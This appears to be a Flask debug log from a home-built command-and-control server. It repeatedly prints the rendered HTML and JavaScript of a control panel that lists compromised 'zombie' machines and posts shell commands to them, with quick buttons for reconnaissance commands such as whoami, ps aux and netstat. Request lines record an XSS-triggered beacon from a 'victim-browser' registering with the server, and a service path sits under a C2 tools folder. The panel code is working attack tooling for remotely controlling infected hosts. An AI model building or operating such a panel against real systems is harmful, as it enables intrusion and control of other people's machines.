          onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> 殭屍機器上線: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</p>\n            <p><strong>建立時間:</strong> 2025-06-24 21:35:42.674482</p>\n        </div>\n        \n        <div class="message">\n            <p><strong>目標IP:</strong> victim-browser</p>\n            <p><strong>目標配置:</strong> XSS_GET_signal</p>\n            <p><strong>建立時間:</strong> 2025-06-24 23:11:42.123832</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 23:12:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:12:11] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 23:12:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:12:11] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 23:12:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:12:11] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 23:12:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 23:12:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:12:17] "[33mGET /add_message?message=XSS_GET_signal&target_ip=victim-browser HTTP/1.1[0m" 404 -
2025-06-24 23:12:17 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-24 23:12:17 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('victim-browser', 'XSS_GET_signal', None, '2025-06-24 23:12:17.266396', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-24 23:12:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0047s) -> 回傳: (<Response 384 bytes [200 OK]>, 500)
2025-06-24 23:12:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:12:17] "[35m[1mGET /api/control/add_message?message=XSS_GET_signal&target_ip=victim-browser HTTP/1.1[0m" 500 -
2025-06-24 23:12:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 23:12:18 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 23:12:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0008s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> 殭屍機器上線: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</p>\n            <p><strong>建立時間:</strong> 2025-06-24 21:35:42.674482</p>\n        </div>\n        \n        <div class="message">\n            <p><strong>目標IP:</strong> victim-browser</p>\n            <p><strong>目標配置:</strong> XSS_GET_signal</p>\n            <p><strong>建立時間:</strong> 2025-06-24 23:11:42.123832</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 23:12:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:12:18] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 23:12:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:12:18] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 23:12:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:12:18] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 23:12:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 23:12:19 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 23:12:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0019s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> 殭屍機器上線: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</p>\n            <p><strong>建立時間:</strong> 2025-06-24 21:35:42.674482</p>\n        </div>\n        \n        <div class="message">\n            <p><strong>目標IP:</strong> victim-browser</p>\n            <p><strong>目標配置:</strong> XSS_GET_signal</p>\n            <p><strong>建立時間:</strong> 2025-06-24 23:11:42.123832</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 23:12:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:12:19] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 23:12:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:12:19] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 23:12:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:12:19] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 23:12:33 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 23:12:33 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 23:12:33 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 23:12:33 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 23:12:33 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 23:12:33 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 23:12:33 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 23:12:33 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 23:12:33 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-24 23:12:37 | INFO     | start_flaresolverr.py:104 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-24 23:12:37 | INFO     | start_flaresolverr.py:242 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-24 23:12:37 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 23:12:37 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 23:12:37 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 23:12:37 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-24 23:12:37 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 23:12:37 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-24 23:12:37 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 23:12:37 | INFO     | app.py:186 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-24 23:12:37 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 23:12:37 | INFO     | app.py:196 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-24 23:12:37 | INFO     | start_flaresolverr.py:59 | start_flaresolverr() | FlareSolverr 已經在運行
2025-06-24 23:12:37 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 23:12:37 | INFO     | app.py:199 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-24 23:12:37 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
